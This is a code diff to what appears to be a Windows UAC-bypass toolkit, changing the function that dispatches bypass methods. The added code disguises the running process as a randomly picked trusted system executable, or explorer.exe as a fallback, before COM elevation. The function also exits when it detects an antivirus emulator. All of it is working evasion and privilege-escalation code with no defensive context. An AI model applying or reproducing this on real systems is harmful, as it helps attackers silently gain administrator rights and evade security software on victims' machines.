@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.70
 *
-*  DATE:        07 May 2026
+*  DATE:        19 May 2026
 *
 *  UAC bypass dispatch.
 *
@@ -291,15 +291,17 @@ NTSTATUS MethodsManagerCall(
     _In_ UCM_METHOD Method
 )
 {
-    BOOL        bParametersBlockSet = FALSE;
+    BOOL        bParametersBlockSet = FALSE, bMasqueraded = FALSE;
     NTSTATUS    MethodResult, Status;
     ULONG       PayloadSize = 0, DataSize = 0;
     PVOID       PayloadCode = NULL, Resource = NULL;
     PVOID       ImageBaseAddress = g_hInstance;
-
+    
     PUCM_API_DISPATCH_ENTRY Entry;
 
     UCM_PARAMS_BLOCK ParamsBlock;
+    SUP_EXECUTABLE_LIST TrustedAppList;
+    SUP_EXECUTABLE_ENTRY *TrustedApp;
 
     if (wdIsEmulatorPresent3()) {
         return STATUS_NOT_SUPPORTED;
@@ -307,6 +309,22 @@ NTSTATUS MethodsManagerCall(
 
     if (Method >= UacMethodMax) {
         return STATUS_INVALID_PARAMETER;
+    }
+
+    if (Method != UacMethodTest) {
+        // For a COM elevation pick random executable from trusted list.
+        RtlSecureZeroMemory(&TrustedAppList, sizeof(TrustedAppList));
+        if (supBuildSystemRootExecutableList(&TrustedAppList)) {
+            TrustedApp = supSelectRandomExecutable(&TrustedAppList);
+            if (TrustedApp) {
+                supMasqueradeProcess(FALSE, &TrustedApp->FullPath[TrustedApp->NameOffset]);
+                bMasqueraded = TRUE;
+            }
+            supFreeExecutableList(&TrustedAppList);
+        }
+        // Fallback to default in case of error.
+        if (!bMasqueraded)
+            supMasqueradeProcess(FALSE, EXPLORER_EXE);
     }
 
     //
